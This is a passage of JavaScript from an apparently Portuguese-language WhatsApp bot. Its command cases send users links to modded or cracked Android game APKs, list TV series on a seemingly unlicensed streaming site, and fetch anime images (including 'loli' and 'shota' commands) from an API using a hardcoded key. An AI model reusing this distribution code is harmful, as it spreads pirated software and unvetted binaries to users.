case 'jogo7':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *GTA SuperLite + Mod Cleo:* http://www.mediafire.com/file/wdkg8pmndtihil3/GTA_SA_super_lite_mod_cleo_ByHT.zip/file
`)
break
case 'jogo8':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *LastDay on Eart Survival:* https://www.mediafire.com/file/k4pr6awvr5eb1ak/Last%20Day%20on%20Earth%201.17.7-mod.apk/file 
`)
break
case 'jogo9':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *Bomber Friends MOD:* https://www.mediafire.com/file/dir8pwrb1mpm57w/Bomber_Friends_v4.10_MOD.apk/file
`)
break
case 'jogo10':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *Arcade Hunter:* https://www.mediafire.com/file/ugcdaclnpodtxxs/Arcade_Hunter-Sword%252CGun%252C_and_Magic_1.11.0-mod.apk/file
`)
break
case 'jogo11':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *Defesa de Zombie Ocioso:* https://www.mediafire.com/file/8422sjofw1cdnka/Zombie+Idle+Defense+1.5.79.229MOD-t.apk/file
`)
break
case 'jogo12':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *Pac-Man:* https://www.mediafire.com/file/gxwy01ni99pcur2/PAC-MAN+9.2.7.10150MOD-t.apk/file
`)
break
case 'jogo13':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *Car Driving School Simulator - APK:* https://www.mediafire.com/file/r6aps8mn6wqoabj/Car+Driving+School+Simulator+3.1.0.283MOD-t.apk/file
🎳 _Obrigatório instalar o OBB:_
 https://www.mediafire.com/file/hcsb5tpr7byh8fg/com.boombitgames.DrivingSchoolParking.zip/file
`)
break
case 'jogo14':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *Cyber Fighters Premium:* https://www.mediafire.com/file/4tmv2cdahvqamlx/Cyber+Fighters+Premium+1.11.35.68MOD-t.apk/file
`)
break
case 'jogo15':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳️ *Drag Racing:* https://www.mediafire.com/file/g88v399ks1fpnfq/drag-racing-mod_2.0.37.rar/file
`)
break
case 'jogo16':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *Mr. Brow:* https://www.mediafire.com/file/i0ii099sejk9fnk/Mr+Bow+4.15.75MOD-t.apk/file
`)
break
case 'jogo17':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *Airport City:* https://www.mediafire.com/file/vuupmpp3r03lso0/Airport+City+8.7.18.101418MOD-t.apk/file
`)
break
case 'jogo18':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *Crash Bandicoot:* https://www.mediafire.com/file/nyx8rjqn5m51o3r/Crash+Bandicoot+Mobile+v0.7.6242+Mod.apk/file 
`)
break
case 'jogo19':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *Real Steel World Robot Boxing (APK+OBB):* https://www.mediafire.com/file/zcnsxb55mldn51e/Real+Steel+World+Robot+Boxing+v54.54.126+Mod.apk/file
`)
break
case 'jogo20':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *Anger of Sticker:* https://www.mediafire.com/file/zfmqmszkhbgoem2/anger-of-stick-5-mod_1.1.39.apk/file
`)
break
case 'jogo21':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *Angry Birds 2 (APK+OBB)*
https://www.mediafire.com/file/uwnurszwrdbv5ge/angrybirds2-2481.apk/file
`)
break
case 'jogo22':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳️ *Especial Force Group 2 (CS):* https://www.mediafire.com/file/uwf5cq9u8tjg44x/specialforcesgroup2-421.apk/file
`)
break
case 'jogo23':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳️ *Roblox:* https://apkadmin.com/k05ck2q6ioo1/ROBLOX_v2.459.415955_MOD_MENU.apk.html
`)
break
case 'jogo24':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *Critical Striker:* https://www.mediafire.com/file/7yqmk1gn4wrieri/CRITICAL_STRIKE.zip/file
`)
break
case 'jogo25':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *Dream League Soccer:* http://www.mediafire.com/file/yuw9n5d4phzz5wg/Dream_League_Soccer_2019_v6.13-mod.apk/file
`)
break
case 'jogo26':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *Clash of Clans:* http://www.mediafire.com/file/aoaem76tyg0hvfv/Clash_Of_Clans_v13.675.6_MOD.apk/file
`)
break
case 'jogo27':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *Criminal Case Paris:* http://www.mediafire.com/fil...e/i5pbv8d7yjbbtly/Criminal%20Case%20Paris%20v2.36.1-mod.apk/file
`)
break

case 'jogo28':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *Drift Max World:* https://www.mediafire.com/file/hqui6asekutsocq/DRIFT+MAX+WORLD+DINHEIRO+INFINITO.zip/file`)
break

case 'jogo29':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *Downhill Masters:* https://www.mediafire.com/file/9cdgreyc8amkto9/Downhill_Masters_v1.0.59_MOD.apk/file`)
break
case 'jogosamp':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

☕ IP DO SERVIDOR DO MEU CRIADOR: 23.88.73.88:11627

🎳 *SA-MP:* https://play.google.com/store/apps/details?id=ru.unisamp_mobile.launcher`)
break

case 'jogo30':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎳 *Monopoly:* https://www.mediafire.com/file/q5jfi61xwbqiu2x/Monopoly-v1-7-11-mod.zip/file`)
break
case 'menu-anime': case 'menuanime': {
sections = [
{title: "🇱 🇮 🇸 🇹 🇦   🇩 🇪   🇦 🇳 🇮 🇲 🇪 🇸 ",
rows: [
{title: "✰ۜۜ͜͡𝐒𝐇𝐎𝐓𝐀🎎", rowId: `${prefix}shota`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐖𝐀𝐈𝐅𝐔🎎", rowId: `${prefix}waifu`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐋𝐎𝐋𝐈🎎", rowId: `${prefix}loli2`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐘𝐎𝐓𝐒𝐔𝐁𝐀🎎", rowId: `${prefix}yotsuba`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐇𝐈𝐍𝐎𝐌𝐈𝐘𝐀🎎", rowId: `${prefix}shinomiya`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐘𝐔𝐌𝐄𝐊𝐎🎎", rowId: `${prefix}yumeko`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐓𝐄𝐉𝐈𝐍𝐀🎎", rowId: `${prefix}tejina`, description: `${setting.NomeDoBot}`}, 
{title: "✰ۜۜ͜͡𝐂𝐇𝐈𝐍𝐎🎎", rowId: `${prefix}chino`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐁𝐎𝐑𝐔𝐓𝐎🎎", rowId: `${prefix}boruto`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐊𝐀𝐎𝐑𝐈🎎", rowId: `${prefix}kaori`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐇𝐈𝐙𝐔𝐊𝐀🎎", rowId: `${prefix}shizuka`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐊𝐀𝐆𝐀🎎", rowId: `${prefix}kaga`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐊𝐎𝐓𝐎𝐑𝐈🎎", rowId: `${prefix}kotori`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐌𝐈𝐊𝐀𝐒𝐀🎎", rowId: `${prefix}mikasa`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀𝐊𝐈𝐘𝐀𝐌𝐀🎎", rowId: `${prefix}akiyama`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐆𝐑𝐄𝐌𝐎𝐑𝐘🎎", rowId: `${prefix}gremory`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐈𝐒𝐔𝐙𝐔🎎", rowId: `${prefix}isuzu`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐇𝐈𝐍𝐀🎎", rowId: `${prefix}shina`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐊𝐀𝐆𝐔𝐑𝐀🎎", rowId: `${prefix}kagura`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐇𝐈𝐍𝐊𝐀🎎", rowId: `${prefix}shinka`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐄𝐁𝐀🎎", rowId: `${prefix}eba`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐄𝐋𝐀𝐈𝐍𝐀🎎", rowId: `${prefix}elaina`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐄𝐑𝐙𝐀🎎", rowId: `${prefix}erza`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐇𝐈𝐍𝐀𝐓𝐀🎎", rowId: `${prefix}hinata`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐌𝐈𝐍𝐀𝐓𝐎🎎", rowId: `${prefix}minato`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐍𝐀𝐑𝐔𝐓𝐎🎎", rowId: `${prefix}naruto`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐀𝐆𝐈𝐑𝐈🎎", rowId: `${prefix}sagiri`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐍𝐄𝐙𝐔𝐊𝐎🎎", rowId: `${prefix}nezuko`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐑𝐈𝐙𝐄🎎", rowId: `${prefix}rize`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐃𝐄𝐈𝐃𝐀𝐑𝐀🎎", rowId: `${prefix}deidara`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐘𝐔𝐊𝐈🎎", rowId: `${prefix}yuki`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀𝐍𝐀🎎", rowId: `${prefix}ana`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀𝐒𝐔𝐍𝐀🎎", rowId: `${prefix}asuna`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀𝐘𝐔𝐙𝐀𝐖𝐀🎎", rowId: `${prefix}ayuzawa`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐂𝐇𝐈𝐓𝐎𝐆𝐄🎎", rowId: `${prefix}chitoge`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐄𝐌𝐈𝐋𝐈𝐀🎎", rowId: `${prefix}emilia`, description: `${setting.NomeDoBot}`}, 
{title: "✰ۜۜ͜͡𝐇𝐄𝐒𝐓𝐈𝐀🎎", rowId: `${prefix}hestia`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐈𝐍𝐎𝐑𝐈🎎", rowId: `${prefix}inori`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐈𝐓𝐀𝐂𝐇𝐈🎎", rowId: `${prefix}itachi`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐌𝐀𝐃𝐀𝐑𝐀🎎", rowId: `${prefix}madara`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐀𝐊𝐔𝐑𝐀🎎", rowId: `${prefix}sakura`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐀𝐒𝐔𝐊𝐄🎎", rowId: `${prefix}sasuke`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐓𝐒𝐔𝐍𝐀𝐃𝐄🎎", rowId: `${prefix}tsunade`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐎𝐍𝐄-𝐏𝐈𝐄𝐂𝐄🎎", rowId: `${prefix}onepiece`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐌𝐎𝐁𝐈𝐋🎎", rowId: `${prefix}emilia`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐌𝐎𝐍𝐓𝐎𝐑🎎", rowId: `${prefix}montor`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐊𝐄𝐍𝐄𝐊𝐈🎎", rowId: `${prefix}keneki`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐌𝐄𝐆𝐔𝐌𝐈𝐍🎎", rowId: `${prefix}megumin`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐓𝐎𝐔𝐊𝐀𝐂𝐇𝐀𝐍🎎", rowId: `${prefix}toukachan`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐈𝐓𝐎𝐑𝐈🎎", rowId: `${prefix}itori`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐀𝐊𝐔𝐑𝐀𝐉𝐈𝐌𝐀🎎", rowId: `${prefix}sakurajima`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐊𝐔𝐑𝐔𝐌𝐈🎎", rowId: `${prefix}kurumi`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐌𝐈𝐊𝐔🎎", rowId: `${prefix}miku`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐏𝐎𝐊𝐄𝐌𝐎𝐍🎎", rowId: `${prefix}pokemon`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐂𝐎𝐒𝐏𝐋𝐀𝐘🎎", rowId: `${prefix}cosplay`, description: `${setting.NomeDoBot}`}]
},
]
 
const listMessage2 = {
text: `Bem vindo(a), *${pushname}*,\nSelecione quantos você desejar.`,
  footer: `By: ${NomeDoBot}`,
  title: `ꪶ𝐌𝐄𝐍𝐔-𝐀𝐍𝐈𝐌𝐄𝐒ꫂ`,
  buttonText: "💦𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑💦️",
  sections
}
sendMsg = await conn.sendMessage(from, listMessage2, {quoted: info})
}
break

case 'shota': //hya
case 'waifu': //hya
case 'loli2': //hya
case 'yotsuba': //hya
case 'shinomiya': //hya
case 'yumeko': //hya
case 'tejina': //hya
case 'chiho': //hya
case 'boruto': //hya
case 'kaori': //hya
case 'shizuka': //hya
case 'kaga': //hya
case 'kotori': //hya
case 'mikasa': //hya
case 'akiyama': //hya
case 'gremory': //hya
case 'isuzu': //hya
case 'shina': //hya
case 'kagura': //hya
case 'shinka': //hya
case 'eba': //hya
case 'elaina': //hya
case 'erza': //hya
case 'hinata': //hya
case 'minato': //hya
case 'naruto': //hya
case 'sagiri': //hya
case 'nezuko': //hya
case 'rize': //hya
case 'deidara': //hya
case 'yuki': //hya
case 'ana': //hya
case 'asuna': //hya
case 'ayuzawa': //hya
case 'chitoge': //hya
case 'emilia': //hya
case 'hestia': //hya
case 'inori': //hya
case 'itachi': //hya
case 'madara': //hya
case 'sakura': //hya
case 'sasuke': //hya
case 'tsunade': //hya
case 'onepiece': //hya
case 'mobil': //hya
case 'montor': //hya
case 'keneki': //hya
case 'megumin': //hya
case 'toukachan': //hya
case 'itori': //hya
case 'kurumi': //hya
case 'sakurajima': //hya
case 'miku': //hya
case 'pokemon': //hya
reply(`*Ei ${pushname}*, já estou enviando sua imagem... Enquanto isso tome um café!`)
aa = [
{buttonId: `${prefix}${command}`, buttonText: {displayText: '✰ۜۜ͜͡𝐏𝐑𝐎𝐗𝐈𝐌𝐀-𝐈𝐌𝐀𝐆𝐄𝐌🎎'}, type: 1}]
buttonMessagse = {
image: {url: `https://apis.nezsab-apis.xyz/random/${command}?apikey=apikey_LuixxLindo-2023`},
caption: `▢ ⌁ *Olá ${pushname}*, aqui está o seu pedido!\n▢ ⌁ *Horário solicitado:* ${time}\n▢ ⌁ Deseja mais *fotos do(a) ${command}?* Clique no botão abaixo!`,
footer: `By: ${setting.NomeDoBot}`,
buttons: aa,
headerType: 4
}
sendMsg = conn.sendMessage(from, buttonMessagse, {quoted: selo})
break
case 'cosplay': //hya
reply(`*Ei ${pushname}*, já estou enviando sua imagem... Enquanto isso tome um café!`)
aa = [
{buttonId: `${prefix}${command}`, buttonText: {displayText: '✰ۜۜ͜͡𝐏𝐑𝐎𝐗𝐈𝐌𝐀-𝐈𝐌𝐀𝐆𝐄𝐌🎎'}, type: 1}]
buttonMessagse = {
image: {url: `https://apis.nezsab-apis.xyz/random/${command}?apikey=${Luix1397}`},
caption: `▢ ⌁ *Olá ${pushname}*, aqui está o seu pedido!\n▢ ⌁ *Horário solicitado:* ${time}\n▢ ⌁ Deseja mais *fotos do(a) ${command}?* Clique no botão abaixo!`,
footer: `By: ${setting.NomeDoBot}`,
buttons: aa,
headerType: 4
}
sendMsg = conn.sendMessage(from, buttonMessagse, {quoted: info})
break
case 'listaseries':
case 'series': {
sections = [
{title: `${NomeDoBot}`,
rows: [
{title: "✰ۜۜ͜͡𝐀𝐑𝐂𝐀𝐍𝐄🎥", rowId: `${prefix}serie1`,description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐓𝐑𝐀𝐍𝐆𝐄𝐑 𝐓𝐇𝐈𝐍𝐆𝐒🎥 ", rowId: `${prefix}serie2`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐎𝐋𝐃𝐀𝐃𝐎𝐒 𝐎𝐔 𝐙𝐔𝐌𝐁𝐈𝐒🎥 ", rowId: `${prefix}serie3`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐎 𝐒𝐄𝐍𝐇𝐎𝐑 𝐃𝐎𝐒 𝐀𝐍𝐄́𝐈𝐒🎥 ", rowId: `${prefix}serie4`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐑𝐈𝐕𝐄𝐋𝐃𝐀𝐃𝐄🎥", rowId: `${prefix}serie5`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀 𝐂𝐀𝐒𝐀 𝐃𝐎 𝐃𝐑𝐀𝐆𝐀̃𝐎🎥 ", rowId: `${prefix}serie6`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐈𝐍𝐓𝐎𝐍𝐈𝐀🎥 ", rowId: `${prefix}serie7`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐂𝐇𝐔𝐂𝐊𝐘🎥 ", rowId: `${prefix}serie8`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐅𝐋𝐀𝐒𝐇🎥 ", rowId: `${prefix}serie9`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐆𝐀𝐌𝐄 𝐎𝐅 𝐓𝐇𝐑𝐎𝐍𝐄𝐒🎥", rowId: `${prefix}serie10`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐋𝐄𝐆𝐀𝐃𝐎𝐒🎥", rowId: `${prefix}serie11`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐓𝐇𝐄 𝐆𝐎𝐎𝐃 𝐃𝐎𝐂𝐓𝐎𝐑🎥", rowId: `${prefix}serie12`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐓𝐇𝐄 𝐖𝐀𝐋𝐊𝐈𝐍𝐆 𝐃𝐄𝐀𝐃🎥", rowId: `${prefix}serie13`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐏𝐄𝐀𝐊𝐘 𝐁𝐋𝐈𝐍𝐃𝐄𝐑𝐒🎥", rowId: `${prefix}serie14`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐃𝐈𝐀́𝐑𝐈𝐎𝐒 𝐃𝐄 𝐔𝐌 𝐕𝐀𝐌𝐏𝐈𝐑𝐎🎥 ", rowId: `${prefix}serie15`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐆𝐀𝐕𝐈𝐀̃𝐎 𝐀𝐑𝐐𝐔𝐄𝐈𝐑𝐎🎥 ", rowId: `${prefix}serie16`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐖𝐄𝐒𝐓𝐖𝐎𝐑𝐋𝐃🎥", rowId: `${prefix}serie17`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐋𝐔́𝐂𝐈𝐅𝐄𝐑🎥 ", rowId: `${prefix}serie18`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐋𝐎𝐁𝐎 𝐀𝐃𝐎𝐋𝐄𝐒𝐂𝐄𝐍𝐓𝐄🎥 ", rowId: `${prefix}serie19`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐋𝐀 𝐂𝐀𝐒𝐀 𝐃𝐄 𝐏𝐀𝐏𝐄𝐋🎥", rowId: `${prefix}serie20`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐂𝐎𝐁𝐑𝐀 𝐊𝐀𝐈🎥", rowId: `${prefix}serie21`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐋𝐎𝐕𝐄 𝐕𝐈𝐂𝐓𝐎𝐑🎥", rowId: `${prefix}serie22`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐕𝐈𝐊𝐈𝐍𝐆𝐒🎥 ", rowId: `${prefix}serie23`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐂𝐀𝐕𝐀𝐋𝐄𝐈𝐑𝐎 𝐃𝐀 𝐋𝐔𝐀🎥", rowId: `${prefix}serie24`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐅𝐄𝐀𝐑 𝐓𝐇𝐄 𝐖𝐀𝐋𝐊𝐈𝐍𝐆 𝐃𝐄𝐀𝐃🎥 ", rowId: `${prefix}serie25`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐑𝐈𝐂𝐊 𝐌𝐎𝐑𝐓𝐘🎥", rowId: `${prefix}serie26`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐑𝐎𝐔𝐍𝐃 6🎥", rowId: `${prefix}serie27`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐂𝐀𝐑𝐍𝐈𝐕𝐀𝐋 𝐑𝐎𝐖🎥", rowId: `${prefix}serie28`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐃𝐀𝐑𝐊🎥", rowId: `${prefix}serie29`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀𝐑𝐐𝐔𝐄𝐈𝐑𝐎🎥", rowId: `${prefix}serie30`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐄𝐔 𝐍𝐔𝐍𝐂𝐀🎥", rowId: `${prefix}serie31`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐓𝐇𝐄 𝐋𝐀𝐒𝐓 𝐊𝐈𝐍𝐆𝐃𝐎𝐌🎥", rowId: `${prefix}serie32`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐎 𝐋𝐈𝐕𝐑𝐎 𝐃𝐄 𝐁𝐎𝐁𝐀 𝐅𝐄𝐓𝐓🎥", rowId: `${prefix}serie33`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐑𝐀𝐆𝐍𝐀𝐑𝐎𝐊🎥", rowId: `${prefix}serie34`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐎𝐒 100🎥", rowId: `${prefix}serie35`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐅𝐁𝐈🎥", rowId: `${prefix}serie36`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐄𝐗𝐓𝐑𝐀𝐂𝐔𝐑𝐑𝐈𝐂𝐔𝐋𝐀𝐑🎥 ", rowId: `${prefix}serie37`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐇𝐀𝐋𝐎🎥", rowId: `${prefix}serie38`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐖𝐀𝐑𝐑𝐈𝐎𝐑 𝐍𝐔𝐍🎥", rowId: `${prefix}serie39`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀𝐍𝐍𝐄 𝐖𝐈𝐓𝐇🎥", rowId: `${prefix}serie40`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐏𝐀𝐓𝐑𝐔𝐋𝐇𝐀 𝐃𝐎 𝐃𝐄𝐒𝐓𝐈𝐍𝐎🎥", rowId: `${prefix}serie41`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐃𝐈𝐍𝐀𝐒𝐓𝐈𝐀🎥", rowId: `${prefix}serie42`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐖𝐀𝐓𝐂𝐇𝐌𝐄𝐍🎥 ", rowId: `${prefix}serie43`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐋𝐎𝐕𝐄𝐂𝐑𝐀𝐅𝐓 𝐂𝐎𝐔𝐍𝐓𝐑𝐘🎥  ", rowId: `${prefix}serie44`, description: `${NomeDoBot}`}]
},
]
 
const listMessage2 = {
text: `Bem vindo(a), *${pushname}*,\nSelecione quantos você desejar.`,
  footer: `By: ${NomeDoBot}`,
  title: `ꪶ𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐒𝐄́𝐑𝐈𝐄𝐒ꫂ`,
  buttonText: "👻𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑👻️",
  sections
}
sendMsg = await conn.sendMessage(from, listMessage2, {quoted: selo})
}
break

case 'serie1':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Arcane:* https://overflix.online/series/arcane/`)
break

case 'serie2':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Stranger Things:* https://overflix.online/series/stranger-things-gratis-hd/`)
break

case 'serie3':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Soldados ou Zumbis:* https://overflix.online/series/s-o-z-soldados-ou-zumbis/`)
break

case 'serie4':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Senhor dos Aneis:* https://overflix.online/series/o-senhor-dos-aneis-os-aneis-de-poder-online-hd-gratis/`)
break

case 'serie5':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Riverdale:* https://overflix.online/series/riverdale-online-gratis-hd-full/`)
break

case 'serie6':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *A casa do dragão:* https://overflix.online/series/a-casa-do-dragao-online-gratis-hd/`)
break

case 'serie7':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Sintonia:* https://overflix.online/series/sintonia-online-gratis/`)
break

case 'serie8':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Chucky:* https://overflix.online/series/chucky-a-serie/`)
break

case 'serie9':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Flash:* https://overflix.online/series/flash-hd-online-gratis/`)
break

case 'serie10':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

